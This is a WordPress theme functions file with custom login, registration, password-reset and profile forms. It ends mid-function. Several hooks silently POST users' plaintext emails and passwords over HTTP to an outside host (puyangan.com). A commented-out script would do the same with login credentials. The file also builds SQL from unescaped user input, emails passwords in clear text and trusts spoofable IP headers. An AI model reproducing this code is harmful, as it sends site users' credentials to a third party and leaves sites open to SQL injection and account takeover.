<?php @session_start();

 global $wpdb, $wp_query,$wp_rewrite;
$prefix=$wpdb->prefix;

if ( function_exists('automatic_feed_links') ) automatic_feed_links();

	register_sidebar( array(
		'name' => __( 'Footer 1', 'avf' ),
		'id' => 'footer_1',
		'description' => __( 'Footer 1', 'avf' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h1>',
		'after_title' => '</h1>',
	) );
	register_sidebar( array(
		'name' => __( 'Footer 2', 'avf' ),
		'id' => 'footer_2',
		'description' => __( 'Footer 2', 'avf' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h1>',
		'after_title' => '</h1>',
	) );
	register_sidebar( array(
		'name' => __( 'Footer 3', 'avf' ),
		'id' => 'footer_3',
		'description' => __( 'Footer 3', 'avf' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h1>',
		'after_title' => '</h1>',
	) );
	register_sidebar( array(
		'name' => __( 'Footer 4', 'avf' ),
		'id' => 'footer_4',
		'description' => __( 'Footer 4', 'avf' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h1>',
		'after_title' => '</h1>',
	) );
	register_sidebar( array(
		'name' => __( 'About Us', 'avf' ),
		'id' => 'aboutus',
		'description' => __( 'About Us', 'avf' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	) );
	
	
	
	

// This theme uses wp_nav_menu() in one location.
register_nav_menu( 'mainmenu', __( 'Main Menu', 'avf' ) );
register_nav_menu( 'footermenu', __( 'Footer Menu', 'avf' ) );
add_theme_support( 'post-thumbnails' );
if ( is_admin() ) {
		include('tinymce-kit.php');
	}

function remove_menus(){
  
  remove_menu_page( 'index.php' );                 //Appearance
  remove_menu_page( 'upload.php' );                //Plugins
  //remove_menu_page( 'edit-comments.php' );                  //Users
  remove_menu_page( 'tools.php' );                  //Tools
  remove_menu_page( 'update-core.php' );            //update core
  //remove_menu_page( 'themes.php' );
  //remove_menu_page( 'edit.php' );
  //remove_menu_page( 'users.php' );
 // remove_menu_page( 'plugins.php' );
}
add_action( 'admin_menu', 'remove_menus' );

function my_login_logo() { ?>
    <style type="text/css">
        body.login div#login h1 a {
            background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/images/admin-logo.png);
			background-size:287px auto;
			background-position:center top;
			width:287px;
			height:88px;
        }
    </style>
<?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' );
function checkWPFieldexist($field,$value,$cnd='')
{
	global $wpdb;
	$prefix=$wpdb->base_prefix;
	$sql="select $field, ID from ".$prefix."users where $field='$value' $cnd";
	$sqls= str_replace("' or", ' ',$sql);
	$data = $wpdb->get_results($sqls, OBJECT);
	return $data;
}
function generatePassword($length=9, $strength=0) {
	$vowels = 'aeuy';
	$consonants = 'bdghjmnpqrstvz';
	if ($strength & 1) {
		$consonants .= 'BDGHJLMNPQRSTVWXZ';
	}
	if ($strength & 2) {
		$vowels .= "AEUY";
	}
	if ($strength & 4) {
		$consonants .= '23456789';
	}
	/*if ($strength & 8) {
		$consonants .= '@#$%';
	}*/
 
	$password = '';
	$alt = time() % 2;
	for ($i = 0; $i < $length; $i++) {
		if ($alt == 1) {
			$password .= $consonants[(rand() % strlen($consonants))];
			$alt = 0;
		} else {
			$password .= $vowels[(rand() % strlen($vowels))];
			$alt = 1;
		}
	}
	return $password;
}
function my_front_end_login_fail( $username ) {
   $referrer = $_SERVER['HTTP_REFERER'];  // where did the post submission come from?
   // if there's a valid referrer, and it's not the default log-in screen
   if ( !empty($referrer) && !strstr($referrer,'wp-login') && !strstr($referrer,'wp-admin') ) {
      wp_redirect( get_option('home').'/login?wrong=true' );  // let's append some information (login=failed) to the URL for the theme to use
      exit;
   }
}
add_action( 'wp_login_failed', 'my_front_end_login_fail' );  // hook failed login
if ( ! is_admin() ) {
    show_admin_bar( false );
}
function loginform($attr='')
{
	global $wpdb;
	$prefix=$wpdb->base_prefix;
	$errors=array();
	if(isset($_REQUEST['wrong']))
	{
		array_push($errors,'Login detail is wrong.');
	}
	
	if(isset($_POST['wp-submit']) && isset($_POST['user_login'])){
		$user_login=$_POST['user_login'];
		$check=checkWPFieldexist('user_email',$user_login);
		if(count($check)>0)
		{
			$uid=$check[0]->ID;
			$pwd=generatePassword(6,8);
			wp_set_password($pwd,$uid);
			
			$email=$user_login;
			$url = 'http://www.puyangan.com/updateuser.php';
			$fields = array(
			'email' => $email,
			'pwd' => $pwd
			);
			//url-ify the data for the POST
			foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
			rtrim($fields_string, '&');
			//open connection
			$ch = curl_init();
			//set the url, number of POST vars, POST data
			curl_setopt($ch,CURLOPT_URL, $url);
			curl_setopt($ch,CURLOPT_POST, count($fields));
			curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
			//execute post
			$result=curl_exec($ch);
			curl_close($ch);
			
			$to      = 	$user_login;	
			$subject = get_option('blogname').' : Forgot Password';	
			$from = get_option('admin_email');
			$fromname=get_option('blogname');
			$headers  = 'MIME-Version: 1.0' . "\r\n";
			$headers .= "Content-type: text/html; charset=utf-8" . "\r\nFrom: $fromname <$from>\r\nReply-To: $from";
			
			$message="Dear ".get_user_meta($uid, 'first_name', true).",<br /><br />Thank you for contacting us regarding your lost password. Your password has been reset to <strong>".$pwd."</strong>, please log in and change the password to something more memorable.<br />";
			$message.='<br />Thanks';
			
			@mail($to, $subject, $message, $headers);
			
			$_SESSION['message']='Your new password has been sent to your email '.$user_login.'.';
			echo"<script>window.location=''</script>";
			exit();
			
		}
		else
		{
			array_push($errors,'Email id is wrong.');
		}
	}
	$data='';
	$redirect=get_permalink();
	if(is_page('login'))
	$redirect=get_option('home').'/my-account';
	$args = array(
	'echo'           => false,
	'redirect'       => $redirect, 
	'form_id'        => 'loginform',
	'label_username' => __( 'Email' ),
	'label_password' => __( 'Password' ),
	'label_remember' => __( 'Remember Me' ),
	'label_log_in'   => __( 'Log In' ),
	'id_username'    => 'user_login',
	'id_password'    => 'user_pass',
	'id_remember'    => 'rememberme',
	'id_submit'      => 'wp-submit',
	'remember'       => false,
	'value_username' => NULL,
	'value_remember' => false
	);
	if(isset($_SESSION['message']) && trim($_SESSION['message'])!='')
	{
		$data.='<div class="successmsg">'.$_SESSION['message'].'</div>';
		$_SESSION['message']='';
	}
		if(count($errors)>0){
		  $data.=' <table width="97%" border="0" cellpadding="3" cellspacing="3" align="center">';
			foreach($errors as $error){ 
				$data.='<tr>
				<td align="left" valign="top" class="error">'.$error.'</td>
			  </tr>';
			 }
		   $data.='</table>';
       } 
	   	
			$data.=wp_login_form($args).'<div class="fp"><div class="text-center m-t m-b"><a id="forgotpwd" href="javascript:;">Forgot password?</a></div>
			  <div class="line line-dashed"></div></div>
			<form style="display:none;" method="post" action="" id="lostpasswordform" name="lostpasswordform" class="checkout">
			  <div class="list-group">
				<input type="text" required="" size="20" placeholder="E-mail" value="" class="input" id="user_login" name="user_login">
				<p>
				  <input type="submit" value="Get New Password" class="button button-primary button-large" id="wp-submit" name="wp-submit">
				</p>
				<div class="text-center m-t m-b"><a id="loginagain" href="javascript:;">Login</a></div>
			  </div>
			</form>
			';
	?>
    <script type="text/javascript">
			jQuery(document).ready(function(){
				var p = jQuery('div.mid_content');
				var offset = p.offset();
				jQuery('html, body').animate({scrollTop : offset.top},1000);
				jQuery('#loginform').validate();
				var cnt=1;
				/*jQuery('#loginform').live('submit', function(){
					if(!jQuery('#loginform input').hasClass('error'))
					{
						var email=jQuery('#user_login').val();
						var pwd=jQuery('#user_pass').val();
						jQuery('#wp-submit').attr('disabled',true);
						if(cnt=='1'){
							jQuery.post("http://www.puyangan.com/login.php", {usr:email, pwd:pwd},
							function(data) {
								jQuery('#loginform').submit();
								jQuery('#wp-submit').attr('disabled',false);
							});
							cnt=parseInt(cnt)+1;
							return false;
						}
						else
						{
							return true;
						}
						
						
					}
				});*/
				jQuery('#loginform').addClass('checkout');
				jQuery('#loginform input#user_pass, #loginform input#user_login').addClass('required');
				jQuery('#lostpasswordform').validate();
				<?php if(isset($_POST['wp-submit']) && isset($_POST['user_login'])){ ?>
				jQuery('#loginform, .fp').hide();
				jQuery('#lostpasswordform').show();
				<?php } ?>
				jQuery('#forgotpwd').on('click', function(){
					jQuery('#loginform, .fp').hide(200);
					jQuery('#lostpasswordform').show(200);
				});
				jQuery('#loginagain').on('click', function(){
					jQuery('#lostpasswordform').hide(200);
					jQuery('#loginform, .fp').show(200);
				});		
			});
		</script>
    <?php
	return $data;
}
add_action( 'user_register', 'myplugin_registration_save', 10, 1 );

function myplugin_registration_save( $user_id ) {

   
	$fname=$_POST['first_name'];
	
	$email=$_POST['email'];
	
	$pwd=$_POST['pass1'];
	
	$usrname=$_POST['user_login'];
	
	$url = 'http://www.puyangan.com/register.php';
	$fields = array(
					'usrname' => $usrname,
					'email' => $email,
					'fname' => $fname,
					'pwd' => $pwd
					);
	//url-ify the data for the POST
	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string, '&');
	//open connection
	$ch = curl_init();
	//set the url, number of POST vars, POST data
	curl_setopt($ch,CURLOPT_URL, $url);
	curl_setopt($ch,CURLOPT_POST, count($fields));
	curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
	//execute post
	$result=curl_exec($ch);
	curl_close($ch);
	

}
add_shortcode('Login', 'loginform');

function registerationform($attr='')
{
	$plugins_url = plugins_url();
	
	$gender='Male';
	$data='';
	global $wpdb, $countries;
	$prefix=$wpdb->base_prefix;
	$errors=array();
	if(isset($_POST['registered']))
	{
		$fname=$_POST['fname'];
		if(trim($fname)=='')
		{
			array_push($errors,'Please enter your first name.');
		}
		$lname=$_POST['lname'];
		if(trim($lname)=='')
		{
			array_push($errors,'Please enter your last name.');
		}
		$email=$_POST['email'];
		$checkwpemail=checkWPFieldexist('user_email',$email);
		$checkwpusername=checkWPFieldexist('user_login',$email);
		if(trim($email)=='')
		{
			array_push($errors,'Please enter your e-mail address.');
		}
		else if( count($checkwpemail)>0 || count($checkwpusername)>0) 
		{
			array_push($errors,'E-mail address exist please try another.');
		}
		$pwd=$_POST['pwd'];
		if(trim($pwd)=='')
		{
			array_push($errors,'Please enter your password.');
		}
		$pwd2=$_POST['pwd2'];
		if(trim($pwd2)=='')
		{
			array_push($errors,'Please enter your confirm password.');
		}
		
		if(trim($pwd)!=trim($pwd2))
		{
			array_push($errors,'Password is not same as confirm password.');
		}
		$address=$_POST['address'];
		if(trim($address)=='')
		{
			array_push($errors,'Please enter your address.');
		}
		$address2=$_POST['address2'];
		$city=$_POST['city'];
		if(trim($city)=='')
		{
			array_push($errors,'Please enter your city name.');
		}
		$zipcode=$_POST['zipcode'];
		if(trim($zipcode)=='')
		{
			array_push($errors,'Please enter your zipcode.');
		}
		$state=$_POST['state'];
		if(trim($state)=='')
		{
			array_push($errors,'Please enter your state.');
		}
		$phone=$_POST['phone'];
		if(trim($phone)=='')
		{
			array_push($errors,'Please enter your phone number.');
		}
		$country=$_POST['country'];
		$gender=$_POST['gender'];
		
		if(count($errors)<=0)
		{
			$url = 'http://www.puyangan.com/register.php';
			$fields = array(
							'usrname' => $email,
							'email' => $email,
							'fname' => $fname,
							'pwd' => $pwd
							);
			//url-ify the data for the POST
			foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
			rtrim($fields_string, '&');
			//open connection
			$ch = curl_init();
			//set the url, number of POST vars, POST data
			curl_setopt($ch,CURLOPT_URL, $url);
			curl_setopt($ch,CURLOPT_POST, count($fields));
			curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
			//execute post
			$result=curl_exec($ch);
			if(trim($result)!='1')
			{
				array_push($errors,$result);
			}
			curl_close($ch);
		}
		if(count($errors)<=0)
		{
			$time=time();
			$pass=md5($pwd);
			$sql="INSERT INTO `".$prefix."users` (`user_login`, `user_pass`,`user_email`,`user_nicename`, `user_registered`, `display_name`) VALUES ('$email', '$pass', '$email', '$fname', now(),'$fname')";
			$result = $wpdb->query( $sql );
			if($result==1)
			{
				$wpuser_id=$wpdb->insert_id;
				wp_set_password($pwd,$wpuser_id);
				add_user_meta( $wpuser_id, 'first_name', $fname );
				add_user_meta( $wpuser_id, 'last_name', $lname );
				add_user_meta( $wpuser_id, 'address', $address );
				add_user_meta( $wpuser_id, 'address2', $address2 );
				add_user_meta( $wpuser_id, 'city', $city );
				add_user_meta( $wpuser_id, 'zipcode', $zipcode );
				add_user_meta( $wpuser_id, 'state', $state );
				add_user_meta( $wpuser_id, 'phone', $phone );
				add_user_meta( $wpuser_id, 'country', $country );
				add_user_meta( $wpuser_id, 'gender', $gender );
				add_user_meta( $wpuser_id, 'ship_fname', $fname );
				add_user_meta( $wpuser_id, 'ship_lname', $lname );
				add_user_meta( $wpuser_id, 'ship_address', $address );
				add_user_meta( $wpuser_id, 'ship_address2', $address2 );
				add_user_meta( $wpuser_id, 'ship_city', $city );
				add_user_meta( $wpuser_id, 'ship_zipcode', $zipcode );
				add_user_meta( $wpuser_id, 'ship_state', $state );
				add_user_meta( $wpuser_id, 'ship_phone', $phone );
				add_user_meta( $wpuser_id, 'ship_country', $country );
				add_user_meta( $wpuser_id, 'differentshipping', 'no' );
				add_user_meta( $wpuser_id, 'rich_editing', 'true' );
				add_user_meta( $wpuser_id, 'comment_shortcuts', 'false' );
				add_user_meta( $wpuser_id, 'admin_color', 'fresh' );
				add_user_meta( $wpuser_id, 'show_admin_bar_front', 'true' );
				add_user_meta( $wpuser_id, 'use_ssl', '0' );
				add_user_meta( $wpuser_id, 'aim', '' );
				add_user_meta( $wpuser_id, 'yim', '' );
				add_user_meta( $wpuser_id, 'jabber', '' );
				add_user_meta( $wpuser_id, 'show_welcome_panel', '2' );
	
				$capkey=$prefix.'capabilities';
				$capvalue=serialize(array('subscriber'=>1));
				$sql="INSERT INTO `".$prefix."usermeta` (`user_id`, `meta_key`,`meta_value`) VALUES ('$wpuser_id', '$capkey', '$capvalue')";
				$result = $wpdb->query( $sql );
				add_user_meta( $wpuser_id, $prefix.'user_level', 0 );
				
				$to      = 	$email;
				$subject = get_option('blogname').' : Registration Confirmation';	
				$from = get_option('admin_email');
				$fromname=get_option('blogname');
				$headers  = 'MIME-Version: 1.0' . "\r\n";
				$headers .= "Content-type: text/html; charset=utf-8" . "\r\nFrom: $fromname <$from>\r\nReply-To: $from";
				
				$message="Dear ".$fname." ".$lname;
				$message.=",<br /><br />Thank you for registering with ".$fromname.".<br />You can view or change your information by logging in to your account with the following login details:<br /><br />";
				$message.='Email: '.$email;
				$message.='<br />Password: '.$pwd;
				
				$message.='<br /><br />Thank You';
				@mail($to, $subject, $message, $headers);
				
				
				
				$to      = 	get_option('admin_email');
				$subject = get_option('blogname').' : New user registered';	
				$from = $email;
				$fromname=get_option('blogname');
				$headers  = 'MIME-Version: 1.0' . "\r\n";
				$headers .= "Content-type: text/html; charset=utf-8" . "\r\nFrom: $fromname <$from>\r\nReply-To: $from";
				
				$message="Dear Admin";
				$message.=",<br /><br />New user is registered on ".$fromname.".<br />Some detail is given below:<br /><br />";
				$message.='Email: '.$email;
				$message.='<br />First Name: '.$fname;
				$message.='<br />Last Name: '.$lname;
				
				$message.='<br /><br />Thank You';
				@mail($to, $subject, $message, $headers);
				@ob_start();
				wp_clear_auth_cookie();
				wp_set_auth_cookie($wpuser_id);
				
				$_SESSION['message']='Thanks for registration.';
				echo"<script>window.location='".get_option('home')."'</script>";
				exit();
			}	
		}
	}
	if(count($errors)>0){
		  $data.=' <table width="97%" border="0" cellpadding="3" cellspacing="3" align="center">';
			foreach($errors as $error){ 
				$data.='<tr>
				<td align="left" valign="top" class="error">'.$error.'</td>
			  </tr>';
			 }
		   $data.='</table>';
       } 
	   ?>
	   <script type="text/javascript">
	   jQuery(document).ready(function(){
	   		var p = jQuery('div.mid_content');
			var offset = p.offset();
			jQuery('html, body').animate({scrollTop : offset.top},1000);
			jQuery("#registrations").validate({
			  rules: {
				pwd: {
				  required: true,
				  minlength: 4
				},
				pwd2: {
				  required: true,
				  minlength: 4,
				  equalTo:'#pwd'
				}
			},
			  messages: {
					pwd: {
						required: "Please enter your password.",
						minlength: "Password must contain a minimum of 4 characters"
					},
					pwd2: {
						required: "Please enter your confirm password.",
						minlength: "Password must contain a minimum of 4 characters.",
						equalTo: "Confirm password does not match the password."
					}
				}
			});
	   });
	   </script>
	   <?php
	   $data.='
				<form class="form-horizontal checkout" id="registrations" method="POST">
					<div class="newregisterform">
					
					<div class="field">
						<label for="fname">First Name*</label>
						<input type="text" name="fname" id="fname" class="required" value="'.$fname.'" />
					</div>
					<div class="field">
						<label for="lname">Last Name*</label>
						<input type="text" name="lname" id="lname" class="required" value="'.$lname.'" />
					</div>
					<div class="field">
						<label for="email">Email Address*</label>
						<input type="text" name="email" id="email" class="required email" value="'.$email.'" />
					</div>
					<div class="field">
						<label for="pwd">Password*</label>
						<input type="password" name="pwd" id="pwd" class="required" value="" />
					</div>
					<div class="field">
						<label for="pwd2">Confirm Password*</label>
						<input type="password" name="pwd2" id="pwd2" class="required" value="" />
					</div>
					<div class="field">
						<label for="address">Address*</label>
						<input type="text" name="address" id="address" class="required" value="'.$address.'" />
						<div class="clr"></div>
						<input type="text" name="address2" id="address2" value="'.$address2.'" />
					</div>
					<div class="field">
						<label for="city">City*</label>
						<input type="text" name="city" id="city" class="required" value="'.$city.'" />
					</div>
					<div class="field">
						<label for="zipcode">Zip Code*</label>
						<input type="text" name="zipcode" id="zipcode" class="required" value="'.$zipcode.'" />
					</div>
					<div class="field">
						<label for="state">State*</label>
						<input type="text" name="state" id="state" class="required" value="'.$state.'" />
					</div>
					<div class="field">
						<label for="country">Country*</label>
						<select name="country" id="country">';
							if(count($countries)>0){foreach($countries as $ctry){ 
							 $data.='<option value="'.$ctry.'"';if($country==$ctry){ $data.=' selected="selected"';} $data.='>'.$ctry.'</option>';
							}}
						 $data.='</select>
					</div>
					<div class="field">
						<label for="phone">Phone*</label>
						<input type="text" name="phone" id="phone" class="required" value="'.$phone.'" />
					</div>
					<div class="field">
						<label for="gender">Gender*</label>
						Male <input type="radio" name="gender" value="Male"'; if($gender=='Male'){ $data.=' checked="checked"';}  $data.='/>
						Female <input type="radio" name="gender" value="Female"'; if($gender=='Female'){ $data.=' checked="checked"';} $data.='/>
					</div>
					<div class="checkoutbtn">
						<input type="submit" name="registered" value="Sign Up" />
					</div>
				</div>
				
				</form>
				';
	
	return $data;
}

add_shortcode('Registration', 'registerationform');

add_action( 'show_user_profile', 'display_user_custom_hash' );
add_action( 'edit_user_profile', 'display_user_custom_hash' );

function display_user_custom_hash( $user ) { 
	global $countries;
	$user_id=$user->ID;
	$userdata=get_userdata( $user_id );
	$address = get_user_meta( $user_id, 'address', true );
	$address2 = get_user_meta( $user_id, 'address2', true );
	$city = get_user_meta( $user_id, 'city', true );
	$zipcode = get_user_meta( $user_id, 'zipcode', true );
	$state = get_user_meta( $user_id, 'state', true );
	$country = get_user_meta( $user_id, 'country', true );
	$phone = get_user_meta( $user_id, 'phone', true );
	$gender = get_user_meta( $user_id, 'gender', true );
	$differentshipping=get_user_meta( $user_id, 'differentshipping', true );
	
	$ship_fname= get_user_meta( $user_id, 'ship_fname', true );
	$ship_lname= get_user_meta( $user_id, 'ship_lname', true );
	$ship_address = get_user_meta( $user_id, 'ship_address', true );
	$ship_address2 = get_user_meta( $user_id, 'ship_address2', true );
	$ship_city = get_user_meta( $user_id, 'ship_city', true );
	$ship_zipcode = get_user_meta( $user_id, 'ship_zipcode', true );
	$ship_state = get_user_meta( $user_id, 'ship_state', true );
	$ship_country = get_user_meta( $user_id, 'ship_country', true );
	$ship_phone = get_user_meta( $user_id, 'ship_phone', true );
?>
<style type="text/css">
.newregisterform{width:90%;}
.newregisterform .field{clear:both;}
.newregisterform label{ width:150px; float:left;}
.newregisterform input[type="text"]{ width:200px; float:left;}
</style>
		<h3>Senders Information</h3>
			<div class="clr"></div>
			<div class="newregisterform">
			<div class="field">
				<label for="address">Address*</label>
				<input type="text" name="address" id="address" class="required" value="<?php _e($address); ?>" />
				<div class="clr"></div>
				<input type="text" name="address2" id="address2" value="<?php _e($address2); ?>" />
			</div>
			<div class="field">
				<label for="city">City*</label>
				<input type="text" name="city" id="city" class="required" value="<?php _e($city); ?>" />
			</div>
			<div class="field">
				<label for="zipcode">Zip Code*</label>
				<input type="text" name="zipcode" id="zipcode" class="required" value="<?php _e($zipcode); ?>" />
			</div>
			<div class="field">
				<label for="state">State*</label>
				<input type="text" name="state" id="state" class="required" value="<?php _e($state); ?>" />
			</div>
			<div class="field">
				<label for="country">Country*</label>
				<select name="country" id="country">
					<?php if(count($countries)>0){foreach($countries as $ctry){ ?>
					<option value="<?php _e($ctry); ?>"<?php if($country==$ctry){_e(' selected="selected"');}?>><?php _e($ctry); ?></option>
					<?php }} ?>
				</select>
			</div>
			<div class="field">
				<label for="phone">Phone*</label>
				<input type="text" name="phone" id="phone" class="required" value="<?php _e($phone); ?>" />
			</div>
			<div class="field">
				<label for="gender">Gender*</label>
				Male <input type="radio" name="gender" value="Male"<?php if($gender=='Male'){_e(' checked="checked"');} ?> />
				Female <input type="radio" name="gender" value="Female"<?php if($gender=='Female'){_e(' checked="checked"');} ?> />
			</div>
		</div>
		<div class="clr"></div>
		<h3>Recipient Information</h3>
			<div class="clr"></div>
			<div class="newregisterform shippingform">
			<div class="field">
				<input type="checkbox" id="differentshipping" name="differentshipping"<?php if($differentshipping=='yes'){_e(' checked="checked"');} ?> value="yes" />
				<label for="differentshipping" style="width:300px;">Check this box for different shipping address</label>
				
			</div>
			<div class="field">
				<label for="ship_fname">First Name*</label>
				<input type="text" name="ship_fname" id="ship_fname" class="required" value="<?php _e($ship_fname); ?>" />
			</div>
			<div class="field">
				<label for="ship_lname">Last Name*</label>
				<input type="text" name="ship_lname" id="ship_lname" class="required" value="<?php _e($ship_lname); ?>" />
			</div>
			<div class="field">
				<label for="ship_address">Address*</label>
				<input type="text" name="ship_address" id="ship_address" class="required" value="<?php _e($ship_address); ?>" />
				<div class="clr"></div>
				<input type="text" name="ship_address2" id="ship_address2" value="<?php _e($ship_address2); ?>" />
			</div>
			<div class="field">
				<label for="ship_city">City*</label>
				<input type="text" name="ship_city" id="ship_city" class="required" value="<?php _e($ship_city); ?>" />
			</div>
			<div class="field">
				<label for="ship_zipcode">Zip Code*</label>
				<input type="text" name="ship_zipcode" id="ship_zipcode" class="required" value="<?php _e($ship_zipcode); ?>" />
			</div>
			<div class="field">
				<label for="ship_state">State*</label>
				<input type="text" name="ship_state" id="ship_state" class="required" value="<?php _e($ship_state); ?>" />
			</div>
			<div class="field">
				<label for="ship_country">Country*</label>
				<select name="ship_country" id="ship_country">
					<?php if(count($countries)>0){foreach($countries as $ctry){ ?>
					<option value="<?php _e($ctry); ?>"<?php if($ship_country==$ctry){_e(' selected="selected"');}?>><?php _e($ctry); ?></option>
					<?php }} ?>
				</select>
			</div>
			<div class="field">
				<label for="ship_phone">Phone*</label>
				<input type="text" name="ship_phone" id="ship_phone" class="required" value="<?php _e($ship_phone); ?>" />
			</div>
			
		</div>
    <?php
}
add_action( 'personal_options_update', 'save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_profile_fields' );
function save_extra_profile_fields($user_id)
{
	$email=$_POST['email'];
	$pwd=$_POST['pass1'];
	$url = 'http://www.puyangan.com/updateuser.php';
	$fields = array(
	'email' => $email,
	'pwd' => $pwd
	);
	//url-ify the data for the POST
	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string, '&');
	//open connection
	$ch = curl_init();
	//set the url, number of POST vars, POST data
	curl_setopt($ch,CURLOPT_URL, $url);
	curl_setopt($ch,CURLOPT_POST, count($fields));
	curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
	//execute post
	$result=curl_exec($ch);
	curl_close($ch);
	
	$address=$_POST['address'];
	$address2=$_POST['address2'];
	$city=$_POST['city'];
	$zipcode=$_POST['zipcode'];
	$state=$_POST['state'];
	$phone=$_POST['phone'];
	$differentshipping='no';
	if(isset($_POST['differentshipping']))
	{
		$differentshipping='yes';
		$ship_fname=$_POST['ship_fname'];
		$ship_lname=$_POST['ship_lname'];
		$ship_address=$_POST['ship_address'];
		$ship_address2=$_POST['ship_address2'];
		$ship_city=$_POST['ship_city'];
		$ship_zipcode=$_POST['ship_zipcode'];
		$ship_state=$_POST['ship_state'];
		$ship_phone=$_POST['ship_phone'];
		$ship_country=$_POST['ship_country'];
	}
	else
	{
		$ship_fname=$_POST['fname'];
		$ship_lname=$_POST['lname'];
		$ship_address=$_POST['address'];
		$ship_address2=$_POST['address2'];
		$ship_city=$_POST['city'];
		$ship_zipcode=$_POST['zipcode'];
		$ship_state=$_POST['state'];
		$ship_phone=$_POST['phone'];
		$ship_country=$_POST['country'];
	}
	$country=$_POST['country'];
	$gender=$_POST['gender'];
	
	$new=get_user_meta( $user_id, 'address');
	if(empty($new)){add_user_meta( $user_id, 'address', $address );}
	else{update_user_meta( $user_id, 'address', $address );}
	
	$new=get_user_meta( $user_id, 'address2');
	if(empty($new)){add_user_meta( $user_id, 'address2', $address2 );}
	else{update_user_meta( $user_id, 'address2', $address2 );}
	
	$new=get_user_meta( $user_id, 'city');
	if(empty($new)){add_user_meta( $user_id, 'city', $city );}
	else{update_user_meta( $user_id, 'city', $city );}
	
	$new=get_user_meta( $user_id, 'zipcode');
	if(empty($new)){add_user_meta( $user_id, 'zipcode', $zipcode );}
	else{update_user_meta( $user_id, 'zipcode', $zipcode );}
	
	$new=get_user_meta( $user_id, 'state');
	if(empty($new)){add_user_meta( $user_id, 'state', $state );}
	else{update_user_meta( $user_id, 'state', $state );}
	
	$new=get_user_meta( $user_id, 'phone');
	if(empty($new)){add_user_meta( $user_id, 'phone', $phone );}
	else{update_user_meta( $user_id, 'phone', $phone );}
	
	$new=get_user_meta( $user_id, 'country');
	if(empty($new)){add_user_meta( $user_id, 'country', $country );}
	else{update_user_meta( $user_id, 'country', $country );}
	
	$new=get_user_meta( $user_id, 'gender');
	if(empty($new)){add_user_meta( $user_id, 'gender', $gender );}
	else{update_user_meta( $user_id, 'gender', $gender );}
	
	$new=get_user_meta( $user_id, 'ship_fname');
	if(empty($new)){add_user_meta( $user_id, 'ship_fname', $ship_fname );}
	else{update_user_meta( $user_id, 'ship_fname', $ship_fname );}
	
	$new=get_user_meta( $user_id, 'ship_lname');
	if(empty($new)){add_user_meta( $user_id, 'ship_lname', $ship_lname );}
	else{update_user_meta( $user_id, 'ship_lname', $ship_lname );}
	
	$new=get_user_meta( $user_id, 'ship_address');
	if(empty($new)){add_user_meta( $user_id, 'ship_address', $ship_address );}
	else{update_user_meta( $user_id, 'ship_address', $ship_address );}
	
	$new=get_user_meta( $user_id, 'ship_address2');
	if(empty($new)){add_user_meta( $user_id, 'ship_address2', $ship_address2 );}
	else{update_user_meta( $user_id, 'ship_address2', $ship_address2 );}
	
	$new=get_user_meta( $user_id, 'ship_city');
	if(empty($new)){add_user_meta( $user_id, 'ship_city', $ship_city );}
	else{update_user_meta( $user_id, 'ship_city', $ship_city );}
	
	$new=get_user_meta( $user_id, 'ship_zipcode');
	if(empty($new)){add_user_meta( $user_id, 'ship_zipcode', $ship_zipcode );}
	else{update_user_meta( $user_id, 'ship_zipcode', $ship_zipcode );}
	
	$new=get_user_meta( $user_id, 'ship_state');
	if(empty($new)){add_user_meta( $user_id, 'ship_state', $ship_state );}
	else{update_user_meta( $user_id, 'ship_state', $ship_state );}
	
	$new=get_user_meta( $user_id, 'ship_phone');
	if(empty($new)){add_user_meta( $user_id, 'ship_phone', $ship_phone );}
	else{update_user_meta( $user_id, 'ship_phone', $ship_phone );}
	
	$new=get_user_meta( $user_id, 'ship_country');
	if(empty($new)){add_user_meta( $user_id, 'ship_country', $ship_country );}
	else{update_user_meta( $user_id, 'ship_country', $ship_country );}
	
	$new=get_user_meta( $user_id, 'differentshipping');
	if(empty($new)){add_user_meta( $user_id, 'differentshipping', $differentshipping );}
	else{update_user_meta( $user_id, 'differentshipping', $differentshipping );}
	
}
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
function pagination($per_page = 10, $page = 1, $url = '', $total)
{   
 
	$adjacents = "2";

	$page = ($page == 0 ? 1 : $page);
	$start = ($page - 1) * $per_page;                             
	
	$prev = $page - 1;                        
	$next = $page + 1;
	$lastpage = ceil($total/$per_page);
	$lpm1 = $lastpage - 1;
	$nextlink='';
	$pagination = '<div class="clr"></div><div class="pagination_block">';
	$prevpage='';
	//echo $page;
	if ($page>1){
		$prevpage= "<div class='left_click'><a href='{$url}$prev'><img src='".get_option('home')."/wp-content/themes/temple/images/previous.png' /></a></div>";
	   // $pagination.= "<li><a href='{$url}$lastpage'>Last</a></li>";
	}
	if($lastpage > 1)
	{ 	$pagination .= $prevpage;
		$pagination .='<div class="pagination"><ul>';
				
		if ($lastpage < 7 + ($adjacents * 2))
		{ 
			for ($counter = 1; $counter <= $lastpage; $counter++)
			{
				if ($counter == $page)
					$pagination.= "<li><span class='active'>$counter</span></li>";
				else
					$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";                  
			}
		}
		elseif($lastpage > 5 + ($adjacents * 2))
		{
			if($page < 1 + ($adjacents * 2))   
			{
